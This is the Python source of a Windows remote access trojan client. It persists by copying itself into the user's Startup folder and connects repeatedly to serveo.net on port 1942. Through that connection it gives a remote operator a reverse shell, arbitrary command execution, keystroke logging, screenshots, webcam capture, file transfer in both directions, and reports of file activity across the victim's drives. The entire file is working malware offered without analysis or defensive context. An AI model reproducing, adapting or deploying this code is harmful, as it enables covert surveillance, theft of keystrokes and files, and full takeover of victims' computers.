import os.path
import socket
import threading
import pynput.keyboard
import pyautogui
import cv2
import multiprocessing
import subprocess
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import json
import win32api
import sys

client_socket = None

if not os.path.isfile(f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\i_am_here.exe") :
    with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\i_am_here.exe", 'wb') as file:
        with open("client_side_final.exe", 'rb') as file_2:
            data = file_2.read()
        file.write(data)


class Reverseshell:

    def __init__(self, socket_name):
        self.socket_name = socket_name
        self.socket_name.settimeout(120)

    def runCMD(self, cmd):
        runcmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return runcmd.stdout.read() + runcmd.stderr.read()

    def upload(self, cmd):
        file_to_send = "".join(cmd.split(":download")).strip()
        if not os.path.isfile(file_to_send):
            self.socket_name.send("error: no such file".encode())
            self.socket_name.recv(2048)
        else:
            self.socket_name.send(b"true")
            self.socket_name.recv(2048)
            with open(file_to_send, 'rb') as f:
                while True:
                    data = f.read(8192)
                    if not data:
                        break
                    self.socket_name.send(data)

    def download(self, cmd):
        file_to_down = "".join(cmd.split(":upload")).strip()
        file_to_down = file_to_down.split("/")[-1] if "/" in file_to_down else file_to_down.split("\\")[
            -1] if "\\" in file_to_down else file_to_down
        print(f"Receiving file...{file_to_down}")
        self.socket_name.settimeout(5)
        with open(file_to_down, 'wb') as file:
            print("Writing")
            while True:
                try:
                    data = self.socket_name.recv(8192)
                    file.write(data)
                except TimeoutError:
                    print(os.path.getsize(file_to_down))
                    self.socket_name.settimeout(None)
                    break

    def start(self):
        try:
            cmd = self.socket_name.recv(8192).decode()
        except (TimeoutError, ConnectionAbortedError, ConnectionRefusedError, ConnectionResetError):
            sys.exit()
        if ":download" in cmd:
            self.upload(cmd)
            self.start()
        elif ":upload" in cmd:
            self.download(cmd)
            self.start()
        elif cmd == ":kill":
            sys.exit()
        elif "cd" in cmd:
            dirc = "".join(cmd.split("cd")).strip()
            if not dirc.strip():
                self.socket_name.send("{}".format(os.getcwd()).encode())
                self.start()
            elif dirc == ".":
                self.socket_name.send("{}".format(os.getcwd()).encode())
                self.start()
            elif dirc == "..":
                os.chdir(dirc)
                self.socket_name.send(b"Working directory changed to ..")
                self.start()
            else:
                if not os.path.isdir(dirc):
                    self.socket_name.send(b"no such directory")
                    self.start()
                else:
                    os.chdir(dirc)
                    self.socket_name.send(f"Changed to dir {dirc}\n".encode())
                    self.start()

        else:
            cmd_output = self.runCMD(cmd)
            if len(cmd_output) == 0:
                self.socket_name.sendall(b"Command Executed Successfully")
            else:
                self.socket_name.sendall(cmd_output)

            self.start()


def start_backdoor(socket_name):
    backdoor = Reverseshell(socket_name)
    backdoor.start()


def send_file(FILENAME, FILESIZE, socket_name):
    SIZE = 8192
    socket_name.send(f'{FILENAME.replace("_", "")}_{FILESIZE}'.encode())
    socket_name.recv(1024)
    with open(FILENAME, 'rb') as file:
        while True:
            data = file.read(SIZE)
            if not data:
                break
            socket_name.send(data)
    if FILENAME == "ss.png":
        os.remove("ss.png")
    if FILENAME == "image.jpg":
        os.remove("image.jpg")


def receive_file(socket_name):
    SIZE = 8192
    data = socket_name.recv(SIZE).decode().split("_")
    FILENAME, FILESIZE = data[0], int(data[1])
    socket_name.send(b'DONE')
    with open(FILENAME, 'wb') as file:
        socket_name.settimeout(5)
        while True:
            try:
                data = socket_name.recv(SIZE)
                file.write(data)

            except TimeoutError:
                socket_name.settimeout(None)
                break


def screenshot():
    ss = pyautogui.screenshot()
    ss.save("ss.png")
    FILENAME = "ss.png"
    FILESIZE = os.path.getsize("ss.png")
    thread3 = threading.Thread(target=send_file, args=(FILENAME, FILESIZE, client_socket3))
    thread3.start()


def capture_image():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if not ret:
        client_socket4.send(b'No camera detected')
        return
    client_socket4.send(b'Cam available')
    cv2.imwrite("image.jpg", frame)
    cam.release()
    FILESIZE = os.path.getsize("image.jpg")
    thread4 = threading.Thread(target=send_file, args=("image.jpg", FILESIZE, client_socket4))
    thread4.start()


log = ""


def keylogger(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += ' '
        else:
            log += ' ' + str(key) + ' '


def send_data(data, socket_name=client_socket):
    FORMAT = 'utf-8'
    i = 0
    while True:
        try:
            send_this = data[i:i + 1024]
        except :
            return
        if not send_this:
            socket_name.send(b'no_data_left')
            break
        i += 1024
        socket_name.send(send_this.encode(FORMAT))
        socket_name.recv(1024)


def recv_data(socket_name=client_socket):
    FORMAT = 'utf-8'
    data_received = ''
    while True:
        data = socket_name.recv(1024).decode(FORMAT)
        if data == 'no_data_left':
            break
        data_received += data
        socket_name.send(b"DONE")
    return data_received



def send_key_logs_regular():
    global log
    while True:
        try:
            if len(log) != 0:
                client_socket5.send(log.encode())
                
                log = ''
            else:
                time.sleep(5)
            time.sleep(5)
        except (ConnectionResetError, ConnectionAbortedError, ConnectionRefusedError, ConnectionError):
            continue


def execute_command():
    try:
        command = client_socket6.recv(2048).decode()
    except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError, ConnectionError) :
        return
    result = subprocess.run(command, shell=True, capture_output=True)
    if len(result.stderr + result.stdout) == 0:
        send_data("COMMAND EXECUTED SUCCESSFULLY", client_socket6)
    send_data((result.stderr + result.stdout).decode(), client_socket6)


def monitor_directory(path_dict):
    observer_status = {}

    def on_created(event):
        if event.is_directory:
            data = f"Directory created: {event.src_path}\n\n"
        else:
            data = f"File created: {event.src_path}\n\n"
        with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\logs.txt", 'ab') as file:
            if "AppData" not in data:

                    if "System32" not in data:
                        if "Windows" not in data:
                            if "ProgramData" not in data:

                                    if "Program Files" not in data:
                                        file.write(data.encode())

    def on_deleted(event):
        if event.is_directory:
            data = f"Directory deleted: {event.src_path}\n\n"
        else:
            data = f"File deleted: {event.src_path}\n\n"
        with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\logs.txt", 'ab') as file:
            if "AppData" not in data:

                    if "System32" not in data:
                        if "Windows" not in data:
                            if "ProgramData" not in data:

                                    if "Program Files" not in data:
                                        file.write(data.encode())

    def on_modified(event):
        if event.is_directory:
            data = f"Directory modified: {event.src_path}\n\n"
        else:
            data = f"File modified: {event.src_path}\n\n"
        with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\logs.txt", 'ab') as file:
            if "AppData" not in data:
                    if "System32" not in data:
                        if "Windows" not in data:
                            if "ProgramData" not in data:
                                    if "Program Files" not in data:
                                        file.write(data.encode())


    def on_moved(event):
        if event.is_directory:
            data = f"Directory renamed : {event.src_path} to {event.dest_path}\n\n"
        else:
            data = f"File renamed : {event.src_path} to {event.dest_path}\n\n"
        with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\logs.txt", 'ab') as f:
            if "AppData" not in data:

                    if "System32" not in data:
                        if "Windows" not in data:
                            if "ProgramData" not in data:

                                    if "Program Files" not in data:
                                        f.write(data.encode())

    event_handler = FileSystemEventHandler()
    event_handler.on_created = on_created
    event_handler.on_moved = on_moved  # Renamed
    event_handler.on_deleted = on_deleted
    event_handler.on_modified = on_modified

    try:
        observer1 = Observer()
        observer1.schedule(event_handler, path_dict['path1'], recursive=True)
        observer1.start()
        observer_status['observer1'] = f"Working on path {path_dict['path1']}"
    except (KeyError, FileNotFoundError, PermissionError):
        observer_status['observer2'] = 'Not Working'
    try:
        observer2 = Observer()
        observer2.schedule(event_handler, path_dict['path2'], recursive=True)
        observer2.start()
        observer_status['observer2'] = f"Working on path {path_dict['path2']}"
    except (KeyError, FileNotFoundError, PermissionError):
        observer_status['observer2'] = 'Not Working'
    try:
        observer3 = Observer()
        observer3.schedule(event_handler, path_dict['path3'], recursive=True)
        observer3.start()
        observer_status['observer3'] = f"Working on path {path_dict['path3']}"
    except (KeyError, FileNotFoundError, PermissionError):
        observer_status['observer3'] = 'Not Working'
    try:
        observer4 = Observer()
        observer4.schedule(event_handler, path_dict['path4'], recursive=True)
        observer4.start()
        observer_status['observer4'] = f"Working on path {path_dict['path4']}"
    except (KeyError, FileNotFoundError, PermissionError):
        observer_status['observer4'] = 'Not Working'
    with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\logs.txt", 'ab') as f:
        for key, value in observer_status.items():
            f.write(f"{key}: {value}\n".encode())
    while True:
        time.sleep(1)


def download_file():

    file_to_send = client_socket7.recv(2048).decode()
    if file_to_send != 'abort':
        if os.path.isfile(file_to_send):
            client_socket7.send(b"Found")
            file_size = os.path.getsize(file_to_send)
            send_file(file_to_send, file_size, client_socket7)

        elif not os.path.isfile(file_to_send):
            client_socket7.send(b'File NOT found.')


def details_send():
    while True:
        try:
            with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\logs.txt", 'rb') as f:
                x = f.read()
                if len(x) != 0:
                    client_socket2.sendall(x)
            with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\logs.txt", 'wb') as f:
                f.truncate(0)
            time.sleep(3)

        except FileNotFoundError:
            continue

        except (ConnectionResetError, ConnectionAbortedError, ConnectionRefusedError, ConnectionError):
            continue


def upload_file():
    thread_receive_file = threading.Thread(target=receive_file, args=(client_socket8,))
    thread_receive_file.start()


def maintain_connection():
    global process_1
    while True:
        try:
            client_socket_main_connection.recv(2048)
            client_socket_main_connection.sendall(b'INTACT')
        except (TimeoutError, ConnectionAbortedError, ConnectionResetError):
            process_1.terminate()
            os._exit(1)


if __name__ == '__main__':

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(('serveo.net', 1942))

        client_socket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket2.connect(('serveo.net', 1942))

        client_socket3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket3.connect(('serveo.net', 1942))

        client_socket4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket4.connect(('serveo.net', 1942))

        client_socket5 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket5.connect(('serveo.net', 1942))

        client_socket6 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket6.connect(('serveo.net', 1942))

        client_socket7 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket7.connect(('serveo.net', 1942))

        client_socket8 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket8.connect(('serveo.net', 1942))

        client_socket9 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket9.connect(('serveo.net', 1942))

        client_socket10 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket10.connect(('serveo.net', 1942))

        client_socket_main_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket_main_connection.connect(('serveo.net', 1942))

    except ConnectionRefusedError:
        os._exit(1)   #Once the program is converted to exe, it can be replaced to re-run the program.

    thread_maintain_connection = threading.Thread(target=maintain_connection, daemon=True)
    thread_maintain_connection.start()

    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    path_dict = {}
    try:
        path_dict['path1'] = drives[0]
        path_dict['path2'] = drives[1]
        path_dict['path3'] = drives[2]
        path_dict['path4'] = drives[3]
    except IndexError:
        pass
    process_1 = multiprocessing.Process(target=monitor_directory, args=(path_dict,))
    process_1.start()

    thread_1 = threading.Thread(target=details_send, daemon=True)
    thread_1.start()

    thread5 = threading.Thread(target=send_key_logs_regular, daemon=True)
    thread5.start()

    keyboard_Listener = pynput.keyboard.Listener(on_press=keylogger)
    keyboard_Listener.start()

    while True:
        data = client_socket.recv(2048).decode()
        if data == 'screenshot':
            screenshot()
        elif data == 'capture_image':
            capture_image()
        elif data == 'send_key_logs':
            send_key_logs()
        elif data == 'change_path':
            path_dict = json.loads(client_socket10.recv(20480).decode())
            path_1 = path_dict['path1']
            path_2 = path_dict['path2']
            path_3 = path_dict['path3']
            path_4 = path_dict['path4']
            response = {'path1': '', 'path2': '', 'path3': '', 'path4': ''}
            if os.path.isdir(path_1) and len(path_1) > 0:
                response['path1'] = f'Working on path:- {path_dict["path1"]}'
            else:
                response['path1'] = 'Not Working'
            if os.path.isdir(path_2) and len(path_2) > 0:
                response['path2'] = f'Working on path:- {path_dict["path2"]}'
            else:
                response['path2'] = 'Invalid Path'
            if os.path.isdir(path_3) and len(path_3) > 0:
                response['path3'] = f'Working on path:- {path_dict["path3"]}'
            else:
                response['path3'] = 'Invalid Path'
            if os.path.isdir(path_4) and len(path_4) > 0:
                response['path4'] = f'Working on path:- {path_dict["path4"]}'
            else:
                response['path4'] = f'Invalid Path Entered'
            if len(path_1) == 0:
                response['path1'] = 'Not specified'
            if len(path_2) == 0:
                response['path2'] = 'Not specified'
            if len(path_3) == 0:
                response['path3'] = 'Not specified'
            if len(path_4) == 0:
                response['path4'] = 'Not specified'
            client_socket10.sendall(json.dumps(response).encode())
            process_1.terminate()
            process_1 = multiprocessing.Process(target=monitor_directory, args=(path_dict,))
            process_1.start()
        elif data == 'execute_command':
            execute_command()
        elif data == 'exit':
            process_1.terminate()
            client_socket.close()
            client_socket2.close()
            exit()
        elif data == 'download_file':
            thread_download_file = threading.Thread(target=download_file, daemon=True)
            thread_download_file.start()
        elif data == 'upload_file':
            thread_upload_file = threading.Thread(target=upload_file, daemon=True)
            thread_upload_file.start()
        elif data == 'reverse_shell':
            thread_reverse = threading.Thread(target=start_backdoor, args=(client_socket9,), daemon=True)
            thread_reverse.start()
        else:
            continue
